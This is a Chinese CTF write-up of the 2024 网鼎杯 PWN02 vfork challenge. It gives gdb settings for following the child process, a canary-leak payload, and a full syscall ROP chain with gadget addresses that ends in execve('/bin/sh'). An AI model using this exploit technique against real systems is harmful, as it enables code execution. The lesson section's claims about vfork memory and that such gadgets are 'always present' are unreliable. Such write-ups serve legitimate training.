---
title: web选手入门pwn(22) 网鼎杯PWN02 vfork
contest: 网鼎杯
year: 2024
difficulty: medium
vuln_type: rop
tags: [vfork, canary-leak, syscall, SROP-chain, ROP-pop-rax]
attack_chain: leave your name填p64(1)*8让后续puts打印栈上数据→泄canary/Wanna return填B跳过return/once again填C*256把栈扩到 canary 区域/fourth sendline after once again再次256字节爆破触发可写/final ROP: read(0,bss,0x100)→execve(/bin/sh,0,0)
key_payload: pop_rax=0x450277  pop_rdi=0x40213f  pop_rsi=0x40a1ae  pop_rdx_rbx=0x485feb  syscall=0x41ac26  bss=0x4CB800
one_liner: 网鼎杯 PWN02，vfork 子进程断点跟随 + 多次 sendlineafter 泄 canary + 自写 read/execve syscall ROP 链。
lesson: vfork 子进程独立地址空间但共用父进程页表；gdb follow-fork-mode child + detach-on-fork off 同时跟踪父子；pop rax+syscall 不需要 magic gadget，可直接构造 read(0,bss,N)→execve(/bin/sh,0,0) 两段 ROP。
quality: high
---

# web选手入门pwn(22) 网鼎杯 PWN02 (vfork)

## 漏洞
- 4 个输入环节：`leave your name` / `Wanna return?` / `once again?` x 多次
- `leave your name` 用 gets 读入无界
- `once again?` 多次 256 字节循环写

## 利用步骤

### Stage 1: 子进程跟踪
- gdb `set follow-fork-mode child` + `set detach-on-fork off`
- 关键断点 `0x401A30`（`leave your name` 处理）/ `0x401995`（`Wanna return?` 后断点）/ `0x4018D4`（`once again?` 处理）

### Stage 2: Canary 泄漏
- `sh.sendafter("leave your name", p64(1)*8)` 8 个 0x1 写满 name 区
- 后续 puts 会顺带打印栈上数据，截取 recvuntil("\n") 第 8-24 字符解析 canary
- 公式：`canary = int(sh.recvuntil("\n")[8:24], 16)`

### Stage 3: 多次喷射对齐栈
- `sh.sendlineafter("once again?", "C"*256)` 第 1 次
- `sh.sendlineafter("once again?", "D"*256)` 第 2 次
- `sh.sendlineafter("once again?", "E"*256)` 第 3 次
- 第 4 次放 ROP payload：`p32(0x11111111)*64 + p64(canary) + p64(canary) + "D"*8` 后面接 ROP 链

### Stage 4: 自构造 syscall ROP
```python
pop_rax = 0x0000000000450277
pop_rdi = 0x000000000040213f
pop_rsi = 0x000000000040a1ae
pop_rdx_rbx = 0x0000000000485feb
syscall = 0x000000000041ac26
ret = 0x41ac28
bss = 0x4CB800
# Stage 4a: read(0, bss, 0x100)
payload += p64(pop_rax) + p64(0x0) + p64(pop_rdi) + p64(0x0) + p64(pop_rsi) + p64(bss) + p64(pop_rdx_rbx) + p64(0x100) + p64(0x100) + p64(syscall) + p64(ret)
# Stage 4b: execve('/bin/sh', 0, 0)
payload += p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0x0) + p64(pop_rdx_rbx) + p64(0x0) + p64(0x0) + p64(syscall)
```

## 经验提炼
- `pop rax; syscall` 是 syscall ROP 链的入口点，二进制中必有
- vfork 场景必须 `follow-fork-mode child`，否则断点落在父进程但栈被子进程修改
- 多次 256 字节 `sendlineafter` 实际是把栈往下"挤"，让下一次 payload 能命中 canary
- `ret` 指令（一个 ret gadget）解决栈对齐问题
